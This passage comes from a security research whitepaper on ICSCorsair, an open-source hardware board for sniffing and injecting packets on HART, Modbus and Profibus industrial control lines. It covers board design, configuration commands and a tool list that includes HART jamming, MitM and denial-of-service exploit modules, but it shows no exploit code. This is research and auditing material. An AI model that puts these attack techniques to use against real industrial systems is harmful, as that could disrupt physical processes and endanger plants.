{
    "id": "6e62cd85-3838-4788-87c6-7c413a43c878",
    "created_at": "2022-10-25T16:48:21.573468Z",
    "updated_at": "2025-03-27T02:05:39.222046Z",
    "deleted_at": null,
    "sha1_hash": "3b57e8833c6eb42bbf90f1d39cf6c3a5927ada34",
    "title": "",
    "authors": "",
    "file_creation_date": "2014-06-30T19:47:41Z",
    "file_modification_date": "2014-06-30T19:47:41Z",
    "file_size": 2308695,
    "plain_text": "# ICSCorsair: How I will PWN your ERP through\n 4-20 mA current loop\n\n**07.08.2014**\n\n**_Authors:_**\n\n_Alexander Bolshev_\n_[(@dark_k3y, abolshev@dsec.ru)](mailto:abolshev@dsec.ru)_\n\n_&&_\n\n_Gleb Cherbov_\n_[(@cherboff, g.cherbov@dsec.ru)](mailto:g.cherbov@dsec.ru)_\n\n_[Digital Security Research Group](http://dsec.ru/ipm-research-center/)_\n\n_ICSCorsair GitHub Repository:_\n_[http://github.com/Darkkey/ICSCorsair](http://github.com/Darkkey/ICSCorsair)_\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n## Table of Contents\n\n0. Intro: What is an ICS? ............................................................................................................................ 3\n\n1. Modern ICS infrastructures == deeply integrated infrastructures ........................................................ 4\n\n2. Attacks from the lower layers – they did not expect this ..................................................................... 6\n\n3. Why do we need yet another tool? ...................................................................................................... 7\n\n4. ICSCorsair as it is.................................................................................................................................... 8\n\n5. ICS Protocol Support. .......................................................................................................................... 16\n\n5.1 HART protocol (HART FSK) ............................................................................................................ 16\n\n5.2 Modbus protocol (over RS-485) .................................................................................................... 20\n\n5.3 Profibus DP protocol ..................................................................................................................... 21\n\n6. Triggering ICS software bugs using ICSCorsair (examples).................................................................. 21\n\n6.1. Denial of Service in INOR MePro .................................................................................................. 21\n\n6.2. SSRF in FieldCare system .............................................................................................................. 22\n\n6.3. XSS in FieldCare Condition monitoring......................................................................................... 26\n\n7. Conclusions and future work .............................................................................................................. 27\n\n8. Thanksgiving service ............................................................................................................................ 28\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n# 0. Intro: What is an ICS?\n\nICS stands for Industrial Control System. This is a general term which unites software and hardware\ncomplexes used in industry automation, including distributed control systems (DCS), supervisory control\nand data acquisition systems (SCADA), and other systems, such as PLC, HMI, MES, etc. Today, ICS\ninfrastructures are commonly used in every factory and even in your house, too! Simplistically, ICS\ncollects data from remote stations, processes them and uses automated algorithms or operator-driven\nsupervisory to create commands to be sent to remote devices (also called field devices). Field devices\nare doing the dirty work, such as condition monitoring, starting and stopping engines, collecting data\nfrom sensors etc.\n\nModern ICS infrastructures have complex architectures that consist of commonly known elements, such\nas servers, PCs, network switches, software technologies (.Net, DCOM, XML, etc.) and more scary things,\nsuch as PLCs, transmitters, actuators, analog control signals, etc. This unity allows us to attack such\nsystems in various ways. In this whitepaper, we will talk about how to use weaknesses in the lower parts\nof ICS (on the level of PLC and field devices) to trigger weaknesses in the higher parts of ICS (MES, PAS,\nand other software). We will walk through the “back door” of ICS to receive our keys to the kingdom.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n# 1. Modern ICS infrastructures == deeply integrated infrastructures\n\nAs we have said earlier, modern ICSs are complex systems which integrate many technologies and\narchitectures. Let’s look at a sketch of the modern ICS infrastructure (see fig. 1). We can see three basic\nlevels of ICS on this figure:\n\n**Figure 1: Modern ICS infrastructure sketch**\n\n1. **Lower level, where field devices are located. As it was mentioned earlier, these devices are**\n\nsuitable for the dirty work – for example, they can monitor temperature and pressure in a\nreactor, control such operations as opening and closing valves, turning pumps on and off, and\nother things. Multiple devices can be used on this level. It may be a low-level Programmable\nLogic Controller (PLC, according to Wikipedia[1]: computer-based, solid-state device that controls\nindustrial processes). Also, transmitters and actuators, controlled by Remote Terminal Units\n(RTU, microprocessor-controlled electronic device that interfaces objects in the physical world\nto a distributed control system or SCADA (supervisory control and data acquisition) system by\ntransmitting telemetry data to a master system, and by using messages from the master\nsupervisory system to control connected objects[2]), can be used in this level. This level is the\n\n1 [http://en.wikipedia.org/wiki/Programmable_logic_controller.](http://en.wikipedia.org/wiki/Programmable_logic_controller)\n2 Gordon R. Clarke, Deon Reynders, Edwin Wright, Practical modern SCADA protocols: DNP3, 60870.5 and related\nsystems Newnes, 2004, ISBN 0-7506-5799-5, pages 19-21.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nkingdom of low-level industrial protocols, such as Modbus or Modbus TCP, HART, Wireless\nHART, Profibus DP or PA, Foundation Fieldbus H1, and others. Low-level ICS engineers,\nelectricians, technicians, and other staff work with ICS on this level.\n2. **Medium level, where we have high-level PLCs, Distributed Control System (DCS, control system,**\n\nusually of a manufacturing system, process or any kind of dynamic system, in which the\ncontroller elements are not central in location (like the brain) but are distributed throughout the\nsystem with each component sub-system controlled by one or more controllers[3]) and\nSupervisory Control and Data Acquisition (SCADA, systems operating with coded signals over\ncommunication channels so as to provide control of remote equipment (using typically one\ncommunication channel per remote station)[4]) systems, Human-Machine Interface (HMI)\ncontrolling stations and various servers such as Open Platform Communications (OPC, earlier\nOLE for Process Control) server. All intellectual work takes place on this level. Here, based on the\ndata from the lower level, operators or automated systems decide what to do and send\ncommands to field-level devices. The entire industrial automation process occurs here.\nOperators, process engineers, ICS engineers, PLC and software programmers work with systems\non this level.\n3. The **upper level** refers to the integration of business with industrial processes. This layer\n\nprovides bindings to corporate networks and Enterprise Resource Planning (ERP) systems.\nVarious Plant Asset Management (PAS) and Manufacture Execution Systems (MES, which\nprovide the right information at the right time and show the manufacturing decision maker\n\"how the current conditions on the plant floor can be optimized to improve production\noutput.\"[5]) work on this level. Management and top-level engineering staff work with ICS on this\nlevel.\n\nNow, you may want to ask a question: “How are such different systems interconnected with each\nother?” If we list the most widely used technologies in ICS, this is what we will get:\n\n      - Windows\n\n      - Linux\n\n      - Ethernet\n\n      - HTTP\n\n      - XML\n\n      - DCOM\n\n      - .NET\n\n      - SOAP\n\n      - SQL\n\nLooks familiar, doesn’t it? You should add the following ICS-specifics terms to the list above:\n\n      - Industrial protocols (DNP3, Modbus/Modbus TCP, Profibus DP/PA, Foundation Fieldbus,\nHART, Profinet, etc.)\n\n      - OPC & friends\n\n      - FDT/DTM\n\n      - Many other things…\n\n3 [http://en.wikipedia.org/wiki/Distributed_Control_System.](http://en.wikipedia.org/wiki/Distributed_Control_System)\n4 [http://en.wikipedia.org/wiki/SCADA.](http://en.wikipedia.org/wiki/SCADA)\n5 McClellan, Michael (1997). Applying Manufacturing Execution Systems. Boca Raton, Fl: St. Lucie/APICS.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nThe answer to your question is “deep integration”. At some point in the past, ICS vendors understood\nthat they should work together. Various standards and specifications were created to help devices,\nsoftware, and technologies from different vendors to work with each other. We have tons of IEC\nspecifications, we have OPC foundation, FDT/DTM consortium, and many vendors develop custom\ntechnologies and methods to integrate with others vendors’ systems. We all know that deep integration\nis not very efficient without deep trust. And this will be our attack point.\n\n# 2. Attacks from the lower layers – they did not expect this\n\nNow is not the era of 199x/200x when every ICS infrastructure was highly insecure. Unpatched systems,\nweb interfaces of PLC and SCADAs staying open to the Internet, total fusion of ICS network and\ncorporate network – most of this is history now. For the old infrastructures that cannot be upgraded\nimmediately, ICS engineers have industrial firewalls, special SIEM-systems, “diodes” systems, special\nconfigurations for IDS/IPS. However, a common mistake when one is establishing the security of ICS\ninfrastructure is to forget about the lower level.\n\nEven in the modern ICS architecture, the lower level is driven by old and dirty industrial protocols. Such\nprotocols have few security mechanisms or don’t have them at all. We are talking about such low-level\nprotocols as Modbus over RS-485, HART, Profibus DP and PA, Foundation Fieldbus H1, and others. These\nprotocols are not based on Ethernet or modern wireless stacks; they are based on the technologies of\n197x-198x. This can be useful in some specific areas of an industrial facility, where electromagnetic or\nother noises can corrupt or disrupt modern L1/L2 network technologies. However, this is rare. In most\nparts of industry, using such old protocols is just legacy. So, when you find a way (using some analog or\ndigital electronics magic) to connect to the low-level industrial protocol line and overcome some\ntechnological “features”, you can sniff and inject your own packets into this network. Sometimes it’s\neasy, sometimes it’s hard, but it’s always possible. However, other devices and applications residing on\nthis line do not expect it. They can be vulnerable to specially crafted packets and instructions – because,\ndue to deep integration and deep trust, their developers (in some cases) didn’t think about receiving\nincorrect packets (yes, they developed mechanisms to evade corrupted packets, but they didn’t expect\npackets with correct CRC and incorrect content. Moreover, some of the data that is collected at the field\ndevice level is passed to the higher levels: not even to the middle layer of SCADA and OPC, but to the\nlayer of MES and even ERP! And this is a very interesting “feature” that can be used to attack not only\nthe lower layers of network and/or industrial processes, but also corporate networks. Imagine hacking\none small transmitter to gain remote command execution on the SAP system. And we will show you\nhow to do this!\n\nTo summarize, if you are able to alter some communications in the lower-layer protocol line, you can:\n\n    - Attack low-level field devices;\n\n    - Forge the information being sent to/from the field devices, and thus alter the industrial\nprocess;\n\n    - Attack systems and applications that are retrieving information from low-level field devices;\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n    - Attack upper-layer applications (e.g. MES) that process pieces of information that has been\ncollected on the field device level;\n\n    - In some cases, attack neighbor systems that are connected to the (vulnerable) upper-layer\napplications processing data from the lower layer.\n\nAll we need is to know how to alter data in low-level industrial protocols lines and what tools to use.\n\n# 3. Why do we need yet another tool?\n\nWhen we started the research of HART protocol security[6], we have searched for some specific or\nuniversal tools for interacting with HART low-level lines (HART FSK, based on current loop and custom\nHART variations based on RS-485). Surprisingly, there are no cheap available tools even for ICS\nengineers. HART modems and HART communicators from well-known vendors are expensive. Moreover,\nmost of them are very noisy and will disturb the line when there are many devices (and especially many\nmaster devices) on it. Once we had understood this, we tried to change the situation.\n\nThe first attempt was to create a HART communication shield for Arduino boards. We’ve used a\ncommon HART modem: IC from Maxim Semiconductors (DS8500) and equipped it with passive input\nfilter and active output filter with signal amplifier. The result was the HRTShield board, which allowed\nturning any Arduino board into a high-power HART modem (see fig. 2). Unfortunately, HRTShield has\nsome weaknesses, one of them being the incapability to generate a stable signal for very long HART lines\n(especially in point-to-point mode).\n\n**Figure 1: HRTShield – high-power HART modem**\n\n[6 See the HART (in)security: how one transmitter can compromise whole plant](http://www.slideshare.net/dark_k3y/hart-insecurity-how-one-transmitter-can-compromise-whole-plant) [and HART As An Attack Vector:](http://www.slideshare.net/dark_k3y/hart-as-an-attack-vector-from-current-loop-to-application-layer)\n[From Current Loop to Application Layer presentations.](http://www.slideshare.net/dark_k3y/hart-as-an-attack-vector-from-current-loop-to-application-layer)\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nFor RS-485 lines, there are many “not-so-cheap” industrial modems and gateways, and also some\nArduino shields and cheap DIY USB modems that can be used for sniffing and/or injecting packets into\nRS-485 lines. However, most of them are noisy, buggy, lack power isolation from high-voltage bursts,\nand need be enclosed with resistances to work with industrial RS-485 lines correctly.\n\nAs for other protocols, such as Profibus DP, DIY hardware doesn’t exist at all, and the price for industrial\ngateways and modems amounts to hundreds and thousands of dollars. Also, using Arduino as a platform\nisn’t very convenient because you need to make many expansion shields (or one big shield for all), and\nlow frequencies and lack of special features make working with high-speed protocols (such as Profibus\nDP) very hard.\n\nIn the ideal case, a platform for hacking and attacking industrial protocols should include:\n\n    - Support for the most used low-level industrial protocols, like Modbus, Profibus, HART;\n\n    - Powerful microcontroller with support for DSP or other extensions; MCU should also be able\nto work with hardware USB;\n\n    - On-board power circuit that can be connected to typical industrial power line voltages (24 V\nor something) and ideally can be powered by a data line (in case of a HART current loop line,\nfor example);\n\n    - Extensions for remote control, via Bluetooth, Wi-Fi or other wireless protocol;\n\n    - Power isolation of microcontroller from industrial data lines, to save it from high-voltage\nbursts;\n\n    - Ability to extend the board to support other industrial protocols.\n\nUsing the upper list, we’ve decided to make such a device. And it’s how the ICSCorsair was born.\n\n# 4. ICSCorsair as it is\n\n**Name. Why do we call it ICSCorsair? No, it isn’t a reference to Pirates of the Caribbean and it’s neither a**\nreference to the famous computer memory vendor :) ICSCorsair is a multi-feature, modular tool which\nsupports extensions. In the WWII, the USAF were armed with an aircraft named F4U “Corsair” (see\nfig. 3). Primarily designed as a carrier-based fighter, it had a long story of usage as a fighter, scout,\nfighter-bomber, and attack aircraft. Its successful design allowed it to survive longer than the time when\njet fighters appeared – the last Corsairs were removed from service at the end of 197x. We hope that\nICSCorsair w0069ll has the same capability and nature for auditing, hacking, and attacking low-level ICS\nnetworks as F4U “Corsair” aircraft had in aircraft and naval battles of the XX century.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n**Figure 3: F4UCorsair and ICSCorsair logo**\n\n**Architecture. Now enough of history and off-topic, and let’s move on to the ICSCorsair internals. On**\nfig. 4, you can see the ICSCorsair board. It consists of several important parts:\n\n**Figure 4: ICSCorsair board**\n\n     - _Power circuit. The board can be powered either by USB or by external 5-36 V power. 5-_\n36 V is the common industrial voltage range, thus ICSCorsair can be powered by almost\nany industrial power supply, and even by a low-level protocol line (in case of HART 2wire connection, when data and power is transmitted by the same wires). The circuit is\nbased on TRACOPOWER TSR-1 power supply, which produces 1 A max output current\nand 84–94 % efficiency, which is more than enough for our goals and also enables\npowering the board efficiently with a set of common batteries (4x1.5 V or 1x9 V).\n\n     - _Isolated power source. The board provides an isolated 5 V power source for powering_\nRS-485 driver and receiver. The isolation of RS-485 provides protection from highvoltage bursts and noises in the low-level protocol lines.\n\n     - _MCU. The core of the board is Cypress PSoC 3 microcontroller unit. Configurable PSoC 3_\ncore was selected for the wide capabilities of creating custom analog and digital\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nperipherals inside the IC. The selected PSoC 3 ICs contain operational amplifiers,\ncomparators, integrators, ADC, VDAC, IDAC, and other useful analog components. Also,\nPSoC 3 allows using PLDs (Programmable Logical Blocks) to create custom digital\nperipherals. Also, this family of ICs has hardware full-speed USB support. E.g., some PLDs\nare used for hardware HART FSK modulators/demodulators, various UARTs and in the\nManchester algorithm. When soldering a board, you can choose between CY8C3446PVI076 (50 MHz frequency) and CY8C3866PVI-021 (67 MHz frequency and internal Digital\nFilter Block). For the common tasks, you’ll be satisfied with CY8C34* MCU. But if you\nwant higher Profibus DP speed or need HART C8PSK support through external module,\nCY8C38* is your choice.\n\n     - _RS-485 module. ADM2486 IC was chosen for communicating with protocols, based on_\nRS-485. It has isolated transceiver, uses half-duplex mode, allows up to 20 Mbps data\nrate and is Profibus compliant.\n\n     - _RS-485 terminator resistor module. In some cases of RS-485 networks, you need to add_\nadditional 120 Ohm resistance in parallel with your devices, to secure line stability. In\nICSCorsair, it’s achieved with optional resistance that can be dynamically turned off or\non with the onboard relay.\n\n     - _HART signal processing module. Instead of using external HART modem IC, the full_\nrealization of HART modulator and demodulator is integrated into the MCU. The\nmodular design of it is shown on figure 5[7].\n\n**Figure 5: HART Demodulator (a) and Modulator (b) modular design**\n\n     - _HART impedance module. A HART modem should be correctly connected to the HART_\ncurrent loop line for noise minimization. In the ICSCorsair board, it is achieved with a 1to-1 transformer and a 10 Ohm/1 uF resistor/capacitor block, which provides\ncharacteristics for HART specification compatibility. Also, the transformer provides the\nisolation of the modem from noises and bursts on the industrial protocol line.\n\n     - _XBee slot. ICSCorsair allows remote connection through an XBee slot. Any XBee_\nBluetooth, Wi-Fi or other wireless module can be used with ICSCorsair.\n\n     - _Extension slot. The main board of the ICSCorsair can be expanded with the extension_\nboard. Up to 4 general GPIO pins, 2 analog (including IDAC), 2 high-current digital and\nI[2]C bus pins are connected to the extension board slot.\n\n**ICSCorsair history and prototypes. During the development process, ICSCorsair has gone through**\nseveral prototypes. The current board version is 0.03.1. Let’s see how ICSCorsair has changed. The\n\n7 This design is almost based on Cypress AN60594 reference design with the minimal changes for supporting HART\nprotocol. The most important changes are: 1) modifying frequencies to fit HART 1200/2200Hz FSK and 2) using\nexternal reference voltage block (instead of internal MCU) for higher stability of signal.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\ndevelopment started using HRTShield as a basis. The first prototype (see fig. 6) is based on CY8C32*\nMCU. It used external IC (Maxim DS8500) as a HART modem with the external op amp, Texas\nInstruments isolated power supply, simple RS-485 transceiver with dual-channel power isolators. The\npower supply was based on 78xx series.\n\n**Figure 6: ICSCorsair first prototype**\n\nThe main disadvantage of the prototype 0.01 was using an old HART modem circuit, with all the\ndisadvantages of HRTShield. In the 0.02 prototype (see fig. 7), HART modem was moved to the MCU. RS485 transceiver and isolators were replaces by an isolated transceiver to save up the space on board.\n78xx power supply circuit was changed to the TSR-1.\n\n**Figure 7: ICSCorsair v.0.02 prototype**\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nUnfortunately, board version 0.02 used passive input band-pass filter for HART demodulator. This\ncaused unstable work on some HART lines. In v. 0.03 (see fig. 8), it was replaced with an active BPF.\nTherefore, MCU was upgraded to CY8C34* series. Also, power circuit was redesigned, analog power was\nseparated from digital and additional filters were added. Murata Power NMR100C replaced Texas\nInstruments power isolator.\n\n**Figure 8: ICSCorsair v.0.03 prototype**\n\nCurrent version 0.03.1, as it was displayed on fig. 4, has slight modifications compared to v. 0.03. First,\nthe external operational amplifier for HART modulator was moved into the MCU. And NMR100C was\nreplaced by the slightly cheaper TRACOPOWER TME0505S 1351 power isolator.\n\n**ICSCorsair operation and modes. When ICSCorsair is powered, it waits for 5 seconds for USB**\nconnection. If there is no connection or the board is configured to ignore USB, the XBee module\nconfiguration is loaded from MCU EEPROM, and the XBee card is initialized. If there is USB connection to\nthe host, the board is represented as an ACM USB TTY device (also known as USB serial port). On\nMac OS X and Linux, the ICSCorsair device is detected automatically, on Windows, you should pre-install\nthe *.inf driver file (see the software folder of the ICSCorsair repository). After establishing connection\nwith the host using USB or XBee card, the device enters the mode that is pre-saved in EEPROM.\nCurrently, ICSCorsair firmware can work in the following modes:\n\n0. Binary configuration mode;\n1. Text configuration mode;\n2. HART FSK mode;\n3. RS-485 mode.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nIn mode 0 (default mode), device can be configured using binary commands[8] that are listed in table 1.\n\n**Command syntax** **Description**\n`0xFE <mode>` Sets default start mode: 0x00 – binary, 0x01 – text, etc.\n`0xFD <USB>` Enable USB at startup: 0x00 – disable, 0x01 – enable.\n`0xFB <XBEE init strings` Initialization strings list for XBEE slot. Each string in lists starts with\n```\nlist> 0xFC\n\n```\n0xBE, then string type; the ‘s’ (0x73) is a command for sending\nstring to the card, it starts 1-byte string length and then 255-max\nbytes string; the ‘d’ (0x64) is a delay command, the following byte\nis the number of seconds for delay.\n`0xFA <mode>` Switch to mode: 0x00 – binary, 0x01 – text, e.t.c.\n`0x85 <speed constant>` Presets the speed of RS-485 port. Speed constant is the number of\nspeed preset. See\n[http://github.com/Darkkey/ICSCorsair/firmware/speed_presets.txt](http://github.com/Darkkey/ICSCorsair/firmware/speed_presets.txt)\nfor more information.\n`0x8E <on/off>` Sets the RS-485 termination resistor on (0x01) or off (0x00).\n**Table 1: ICSCorsair binary configuration mode commands**\n\nIn mode 1, the interactive device configuration menu is shown. Device can be configured using this\nmenu, the command functionality is similar to binary configuration mode commands.\n\nIn mode 2, the device works as a standard HART modem, with 1200 baud, 8N1 and Odd parity. You can\nuse any ICSCorsair as a simple high-power modem with any HART-compatible application.\n\nIn mode 3, the board works as a RS-485 transceiver. The baud is preset using configuration modes and\nmay also be autodetected in USB serial port mode. You can use ICSCorsair with any Modbus-compatible\napplication and use special ICSCorsair Profibus applications in this mode.\n\nTo switch mode out of modes 2 or 3, you should send 0x1B 0x6B 0x43 <mode number in ASCII>\n```\n(Alt+m Shift+c <number in ASCII>. For example, to switch to the text mode, enter Alt+m\nShift+C 1.\n\n```\n**Remote control of the board with XBee slot. ICSCorsair provides capability for controlling the board**\nover a wireless protocol using the XBee slot card. On figure 9, you can see some of the supported XBee\nmodules:\n\n**Figure 9 (from left to right): Bluetooth Bee module plugged in the ICSCorsair XBee slot, Wi-Fi Xbee module, RF**\n\n**XBee module**\n\n8 Commands are subject to change, see the latest command list in ICSCorsair whitepaper from GitHub repository:\n[http://github.com/Darkkey/ICSCorsair.](http://github.com/Darkkey/ICSCorsair)\n\n|Command syntax|Description|\n|---|---|\n|0xFE <mode>|Sets default start mode: 0x00 – binary, 0x01 – text, etc.|\n|0xFD <USB>|Enable USB at startup: 0x00 – disable, 0x01 – enable.|\n|0xFB <XBEE init strings list> 0xFC|Initialization strings list for XBEE slot. Each string in lists starts with 0xBE, then string type; the ‘s’ (0x73) is a command for sending string to the card, it starts 1-byte string length and then 255-max bytes string; the ‘d’ (0x64) is a delay command, the following byte is the number of seconds for delay.|\n|0xFA <mode>|Switch to mode: 0x00 – binary, 0x01 – text, e.t.c.|\n|0x85 <speed constant>|Presets the speed of RS-485 port. Speed constant is the number of speed preset. See http://github.com/Darkkey/ICSCorsair/firmware/speed_presets.txt for more information.|\n|0x8E <on/off>|Sets the RS-485 termination resistor on (0x01) or off (0x00).|\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nThe following commands in text mode configure the XBee Bluetooth module[9] for the ICSCorsair:\n```\ndlay 1<Enter>\nsend \\r\\n+STWMOD=0\\r\\n<Enter>\nsend \\r\\n+STNA=modem\\r\\n<Enter>\nsend \\r\\n+STAUTO=0\\r\\n<Enter>\nsend \\r\\n+STOAUT=1\\r\\n<Enter>\nsend \\r\\n+STPIN=0000\\r\\n<Enter>\ndlay 2<Enter>\nsend \\r\\n+INQ=1\\r\\n<Enter>\ndlay 2<Enter>\n<Enter>\n\n```\nHere, the “send” keyword requests the board to send data to the XBee module, and the “dlay”\ncommand forces the board to wait for the number of seconds in the argument. Press <Enter> twice after\nyou finish configuring. The commands were taken from the official documentation of the XBee module\nand can vary from card to card. These commands will be written to the EEPROM and will be executed at\nstartup, if the XBee module is present. Note that the MCU maximum EEPROM size is 2048 bytes, and\nICSCorsair uses about 32 bytes for other information. Thus, configuration length should not exceed 2000\nbytes.\n\n**ICSCorsair software. ICSCorsair board isn’t just a single piece of electronics hardware. It’s bundled with**\nfirmware and additional software libraries, scripts, and tools that are available in the GitHub repository.\nThe supplied software consists of helper Ruby scripts and libraries, MetaSploit Framework modules and\na mobile application for controlling the board remotely from your phone or tablet.\n\nHelper Ruby scripts:\n\n       - icscorsair_conf.rb – script for binary configuration of your ICSCorsair board.\n\n       - modbus_sniffer.rb – Modbus over RS-485 sniffer.\n\n       - profibus_sniffer.rb – Profibus DP sniffer.\n\n       - hart_jam.rb – HART line JAM tool (sending tons of ‘0’ or ‘1’ to the HART current loop\nline).\n\n       - hart_sniff.rb – HART protocol sniffing tools.\n\n       - hart_mitm.rb – example of HART MitM attack (see below).\n\n       - hart_change_longtag.rb – tool for changing long tag parameter of HART field device,\nuseful in some attacks on HART infrastructures (see below).\n\nMetaSploit Framework modules:\n\n       - auxillary/scanner/scada/hart_scanner.rb – scanner of HART current loop line.\n\n       - auxillary/hart/hart_change_longtag.rb – metasploit wrapper for\nhart_change_longtag.rb.\n\n       - auxillary/hart/hart_sniff.rb – metasploit wrapper for hart_sniff.rb.\n\n       - auxillary/sniffer/modbus_rs485_sniff.rb – metasploit wrapper for\nmodbus_sniffer.rb.\n\n       - exploits/windows/misc/inor_mepro_hart.rb – INOR MePro Denial of Service PoC\nexploit.\n\n[9 See http://www.seeedstudio.com/wiki/index.php?title=Bluetooth_Bee](http://www.seeedstudio.com/wiki/index.php?title=Bluetooth_Bee) for more info.\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nMobile applications. A special mobile application was developed to allow remote connection to the\nICSCorsair from your phone or tablet. Application is written using the Xamarin framework, so you can\nuse it on most popular platforms, such as Android, iOS or Windows Phone. The application screenshot is\nshown on fig. 10.\n\n**Figure 10: ICSCorsair mobile application**\n\n**Extension slot. The board is equipped with extension slot (see fig. 4) where the extension board can be**\nconnected. There are no extension boards for ICSCorsair at this time, but you can design and build your\nown, suitable for your task. In table 2, you can see the description of extension slot pins:\n\n|Pin|Description|\n|---|---|\n|IS5V|Isolated 5V power supply from TRACOPOWER TME0505S 1351|\n|ISGN|Isolated ground from TRACOPOWER TME0505S 1351|\n|GN|Ground|\n|5V|Stabilized 5V power supply|\n|LD (F1)|Green led (USR) pin/Free GPIO pin 1 (if USR led isn’t soldered)|\n|F2|Free GPIO pin 2|\n|F3|Free GPIO pin 3|\n|GND|Ground|\n|SCL|I2C clock pin. (should be pulled up to 3.3V with resistor)|\n|SDA|I2C data pin. (should be pulled up to 3.3V with resistor)|\n|DI|High-current digital input. (SIO)|\n|DO|High-current digital output. (SIO)|\n|GN|Ground|\n|F0|Free GPIO pin 0|\n|AV|Analog filtered 3.3V power|\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nAI Analog pin/Free GPIO pin\nAG Analog filtered ground\nAO Analog pin/Free GPIO pin/DAC pin\nGN Ground\n3.3V Digital 3.3V power\n\n**Table 2: Extension slot pins**\n\n**Open-source hardware. ICSCorsair is an open-sourced hardware. You can find the schematics and PCB**\n[files on GitHub repository at http://github.com/Darkkey/ICSCorsair. Anyone can build their own copy of](http://github.com/Darkkey/ICSCorsair)\nthe board using files from the repository. All firmware and software in the repository are also open[source. You can find the ICSCorsair license at http://github.com/Darkkey/ICSCorsair/LICENSE.](http://github.com/Darkkey/ICSCorsair/LICENSE)\n\n# 5. ICS Protocol Support.\n\n### 5.1 HART protocol (HART FSK)\n\nHART (Highway Addressable Remote Transducer Protocol) is one of the first implementations of field\nbus protocols. The biggest advantage of HART is that it can communicate over standard 4-20 mA current\nloop. In the past, 4-20 mA current loop was used for receiving and sending information to a distant\ntransmitter or actuator, using analog (current) signal level. When HART appeared (mid-1980s), it\nprovided the capabilities for configuring distant devices over current loop and getting/sending\nadditional information to them, rather than reading (or writing) only one variable.\n\nHART is a master-slave protocol. Field devices (transmitters and actuators) appear on the network as\nslaves, whereas computers with HART modems, HART gateways, and PLCs with HART modules are\nmasters. Generally, slave cannot send any packets to the networks other than replies to master.\nAccording to HART specification, there can only be one primary master (PLC, gateway or server) and\nonly one secondary master (PC or HART communicator).\n\nHART uses two different addressing schemas for field devices: logic (polling) and hardware address.\nEvery field device has a unique hardware address (unique address). It consists of Manufacture ID, Device\nID and Unique Device ID. You can look at is as a “MAC” address. Also, in the digital-only mode, every\nfield device has a Polling ID address, an integer in 1-63 range.\n\nHART can work in two different modes: digital/analog and digital only. In the first mode, so-called pointto-point, digital signals are sent over 4-20 mA analog current loop. The master host can receive variable\nvalue traditionally, using analog current value, or based on digital HART packets. In this mode, the\ndevice Polling (logical) address is always fixed to 0. In the second mode (digital, or multidrop), multiple\ndevices exist on the line, and every device has its own Polling ID. When a master starts working with a\ndevice, it will call it by the Polling ID address to determine the field device unique address. Then, the\nmaster will talk to the device personally, using its Unique ID.\n\nIn HART FSK, all data is sent using simple Frequency Shift Keying modulation, when ‘1’ is encoded by one\n1200 Hz harmonic and ‘0’ is encoded by two 2200 Hz harmonics. For more information, see fig. 11.\n\n|AI|Analog pin/Free GPIO pin|\n|---|---|\n|AG|Analog filtered ground|\n|AO|Analog pin/Free GPIO pin/DAC pin|\n|GN|Ground|\n|3.3V|Digital 3.3V power|\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\n**Figure 11: HART FSK[10]**\n\nCurrently, the HART protocol is supported by HART Communication Foundation, see their website\n[http://www.hartcomm.org/ for more detail on this protocol.](http://www.hartcomm.org/)\n\nIntable 3, you can see HART protocol communication levels according to the OSI layers:\n\n**OSI Layer** **HART**\n7 Application Hart commands\n2 Datalink Binary, Master/Slave protocol with CRC\n1 Physical FSK via copper wiring, wireless, RS-485, HART-IP\n\n**Table 3: HART communication layers**\n\nThe physical layer is enabled by HART FSK. HART packets structure on the datalink layer is shown in table\n4:\n\n**Delimeter** **Address** **[Expand]** **Command** **Byte** **[Data]** **Check**\n**Count** **byte**\n\n**Table 4: Datalink structure of a HART packet**\n\nOn the application layer, there are tons of HART commands that can be divided into three categories:\n\n  - Universal (operations with ID, getting variables, setting variable limit and types, tag operations,\netc.);\n\n  - Common practice (engineering and process-specific commands);\n\n  - Device Families (device family and vendor-specific commands).\n\n10 Property of HART Communication Foundation, see\n[http://en.hartcomm.org/hcp/tech/aboutprotocol/aboutprotocol_how.html.](http://en.hartcomm.org/hcp/tech/aboutprotocol/aboutprotocol_how.html)\n\n|Col1|OSI Layer|HART|\n|---|---|---|\n|7|Application|Hart commands|\n|2|Datalink|Binary, Master/Slave protocol with CRC|\n|1|Physical|FSK via copper wiring, wireless, RS-485, HART-IP|\n\n|Delimeter|Address|[Expand]|Command|Byte Count|[Data]|Check byte|\n|---|---|---|---|---|---|---|\n\n\n-----\n\nICSCorsair: How I will PWN your ERP through 4 20 mA\n\ncurrent loop\n\nAdditional addressing scheme is introduced on the application layer of the HART protocol – tag and long\ntag. Tag is a packed ASCII string that provides an ID which is easy to remember for an engineer. The\nmaximum tag length cannot exceed 8 symbols (6 packed ASCII bytes). When the number of field devices\non the facility is increased, engineers need more convenient IDs, so the long tag command was added.\nThe long tag allows storing a 32-byte ASCII string on devices and returning it to masters. This string is\ncommonly used by PAS (Plant Assent Management Systems), OPC servers, MES, and other software to\nidentify field devices in the industrial facility structure.\n\nICSCorsair can make any operations in HART FSK networks. You can sniff and inject packets on point-topoint and multidrop networks. Note 